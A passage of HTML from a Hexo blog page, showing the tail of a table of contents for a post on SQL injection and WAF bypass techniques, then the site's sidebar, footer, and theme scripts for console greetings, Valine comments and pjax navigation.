by查看有多少列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%AF%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-number">4.2.3.</span> <span class="toc-text">查看可回显的字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.</span> <span class="toc-text">黑盒绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%9A%84%E5%9B%9B%E5%A4%A7%E5%88%86%E7%B1%BB"><span class="toc-number">4.3.1.</span> <span class="toc-text">绕过的四大分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84%E5%B1%82%E9%9D%A2%E7%BB%95%E8%BF%87waf"><span class="toc-number">4.3.2.</span> <span class="toc-text">架构层面绕过waf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%BA%90%E7%BD%91%E7%AB%99%E7%BB%95%E8%BF%87-waf-%E6%A3%80%E6%B5%8B"><span class="toc-number">4.3.2.1.</span> <span class="toc-text">寻找源网站绕过 waf 检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%90%8C%E7%BD%91%E6%AE%B5%E7%BB%95%E8%BF%87Waf%E9%98%B2%E6%8A%A4"><span class="toc-number">4.3.2.2.</span> <span class="toc-text">通过同网段绕过Waf防护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E9%99%90%E5%88%B6%E8%A7%92%E5%BA%A6%E7%BB%95%E8%BF%87waf"><span class="toc-number">4.3.3.</span> <span class="toc-text">资源限制角度绕过waf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#post-%E4%BC%A0%E5%8F%82"><span class="toc-number">4.3.3.1.</span> <span class="toc-text">post 传参</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%9F%A5%E7%9C%8B%E5%BA%93%E5%90%8D"><span class="toc-number">4.3.3.2.</span> <span class="toc-text">尝试查看库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%85%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%8C%85-FIXME"><span class="toc-number">4.3.3.3.</span> <span class="toc-text">超大数据包-FIXME</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%B1%82%E9%9D%A2%E7%BB%95%E8%BF%87waf"><span class="toc-number">4.3.4.</span> <span class="toc-text">协议层面绕过waf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E6%9C%AA%E8%A6%86%E7%9B%96%E7%BB%95%E8%BF%87waf"><span class="toc-number">4.3.4.1.</span> <span class="toc-text">协议未覆盖绕过waf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">4.3.4.2.</span> <span class="toc-text">参数污染</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E5%88%99%E5%B1%82%E9%9D%A2%E7%9A%84%E7%BB%95%E8%BF%87waf"><span class="toc-number">4.3.5.</span> <span class="toc-text">规则层面的绕过waf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.5.1.</span> <span class="toc-text">sql注释符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E7%99%BD%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.5.2.</span> <span class="toc-text">空白符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E5%89%B2%E7%AC%A6%E5%8F%B7"><span class="toc-number">4.3.5.3.</span> <span class="toc-text">函数分割符号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%AE%E7%82%B9%E6%95%B0%E8%AF%8D%E6%B3%95%E8%A7%A3%E9%87%8A"><span class="toc-number">4.3.5.4.</span> <span class="toc-text">浮点数词法解释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8error-based%E8%BF%9B%E8%A1%8Csq%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.5.5.</span> <span class="toc-text">利用error- based进行sq注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E7%89%B9%E6%AE%8A%E8%AF%AD%E6%B3%95"><span class="toc-number">4.3.5.6.</span> <span class="toc-text">mysql特殊语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%84%E5%88%99%E7%9A%84waf"><span class="toc-number">4.3.5.7.</span> <span class="toc-text">代码规则的waf</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-TODO"><span class="toc-number">5.</span> <span class="toc-text">练习-TODO</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/06/01/worker/Mcu/ESP-IDF/" title="ESP-IDF"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/wechtdevtools.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ESP-IDF"/></a><div class="content"><a class="title" href="/2026/06/01/worker/Mcu/ESP-IDF/" title="ESP-IDF">ESP-IDF</a><time datetime="2026-06-01T15:58:36.000Z" title="Created 2026-06-01 15:58:36">2026-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/15/worker/Toolbox/Hexo/" title="Hexo"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/other/hexo.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hexo"/></a><div class="content"><a class="title" href="/2023/08/15/worker/Toolbox/Hexo/" title="Hexo">Hexo</a><time datetime="2023-08-15T00:00:00.000Z" title="Created 2023-08-15 00:00:00">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/05/worker/Backender/MongoDB/" title="MongoDB"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/mongodb.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MongoDB"/></a><div class="content"><a class="title" href="/2023/07/05/worker/Backender/MongoDB/" title="MongoDB">MongoDB</a><time datetime="2023-07-05T00:00:00.000Z" title="Created 2023-07-05 00:00:00">2023-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/27/worker/Ops/Linux%E5%91%BD%E4%BB%A4/" title="Linux 命令"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/linux.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux 命令"/></a><div class="content"><a class="title" href="/2023/06/27/worker/Ops/Linux%E5%91%BD%E4%BB%A4/" title="Linux 命令">Linux 命令</a><time datetime="2023-06-27T00:00:00.000Z" title="Created 2023-06-27 00:00:00">2023-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/27/worker/Ops/Docker%20Compose/" title="Docker Compose"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/docker-compose.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker Compose"/></a><div class="content"><a class="title" href="/2023/06/27/worker/Ops/Docker%20Compose/" title="Docker Compose">Docker Compose</a><time datetime="2023-06-27T00:00:00.000Z" title="Created 2023-06-27 00:00:00">2023-06-27</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2026 By <a class="footer-bar-link" href="/" title="adalucky" target="_blank">adalucky</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">61</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">80</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">9</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://hexo.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/archives/"><span> 总览</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/tags/"><span> 标签</span></a></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Axios/" style="font-size: 0.88rem;">Axios<sup>1</sup></a><a href="/tags/Centos/" style="font-size: 0.88rem;">Centos<sup>1</sup></a><a href="/tags/Docker/" style="font-size: 0.88rem;">Docker<sup>2</sup></a><a href="/tags/ES6/" style="font-size: 0.88rem;">ES6<sup>1</sup></a><a href="/tags/ESP-IDF/" style="font-size: 0.88rem;">ESP-IDF<sup>1</sup></a><a href="/tags/Gradle/" style="font-size: 0.88rem;">Gradle<sup>1</sup></a><a href="/tags/Hexo/" style="font-size: 0.88rem;">Hexo<sup>3</sup></a><a href="/tags/JDK17/" style="font-size: 0.88rem;">JDK17<sup>1</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>3</sup></a><a href="/tags/Kafka/" style="font-size: 0.88rem;">Kafka<sup>1</sup></a><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>1</sup></a><a href="/tags/MQ/" style="font-size: 0.88rem;">MQ<sup>1</sup></a><a href="/tags/MongoDB/" style="font-size: 0.88rem;">MongoDB<sup>1</sup></a><a href="/tags/NPM/" style="font-size: 0.88rem;">NPM<sup>1</sup></a><a href="/tags/NeoVim/" style="font-size: 0.88rem;">NeoVim<sup>1</sup></a><a href="/tags/Nginx/" style="font-size: 0.88rem;">Nginx<sup>2</sup></a><a href="/tags/OSS/" style="font-size: 0.88rem;">OSS<sup>1</sup></a><a href="/tags/Obsidian/" style="font-size: 0.88rem;">Obsidian<sup>1</sup></a><a href="/tags/SpringBoot/" style="font-size: 0.88rem;">SpringBoot<sup>3</sup></a><a href="/tags/TS/" style="font-size: 0.88rem;">TS<sup>3</sup></a><a href="/tags/Tag-Plugins/" style="font-size: 0.88rem;">Tag Plugins<sup>1</sup></a><a href="/tags/Tmux/" style="font-size: 0.88rem;">Tmux<sup>1</sup></a><a href="/tags/Vite/" style="font-size: 0.88rem;">Vite<sup>1</sup></a><a href="/tags/Vue3/" style="font-size: 0.88rem;">Vue3<sup>1</sup></a><a href="/tags/Webpack/" style="font-size: 0.88rem;">Webpack<sup>1</sup></a><a href="/tags/Yarn/" style="font-size: 0.88rem;">Yarn<sup>1</sup></a><a href="/tags/asdf/" style="font-size: 0.88rem;">asdf<sup>1</sup></a><a href="/tags/css/" style="font-size: 0.88rem;">css<sup>1</sup></a><a href="/tags/eslint/" style="font-size: 0.88rem;">eslint<sup>1</sup></a><a href="/tags/html/" style="font-size: 0.88rem;">html<sup>1</sup></a><a href="/tags/jenkins/" style="font-size: 0.88rem;">jenkins<sup>1</sup></a><a href="/tags/pinia/" style="font-size: 0.88rem;">pinia<sup>1</sup></a><a href="/tags/setting/" style="font-size: 0.88rem;">setting<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">前端基础<sup>6</sup></a><a href="/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 0.88rem;">小程序<sup>1</sup></a><a href="/tags/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">微信开发者工具<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>1</sup></a><a href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" style="font-size: 0.88rem;">消息队列<sup>1</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/" style="font-size: 0.88rem;">环境管理<sup>1</sup></a><a href="/tags/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B/" style="font-size: 0.88rem;">非关系型<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.7.1",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 adalucky 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'HvNn2fnND9DnBkt32cvR8g5x-gzGzoHsz',
+      appKey: '1FgE4n7EeWrdtvsJCcB20dfD',
+      avatar: 'mp',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[image]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[link]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[code]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=mp'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += 'No Comment'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://HvNn2fnN.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": 'HvNn2fnND9DnBkt32cvR8g5x-gzGzoHsz',
+        "X-LC-Key": '1FgE4n7EeWrdtvsJCcB20dfD',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "Unable to get the data, please make sure the settings are correct."
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://cdn.cbd.int/qrcodejs@1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
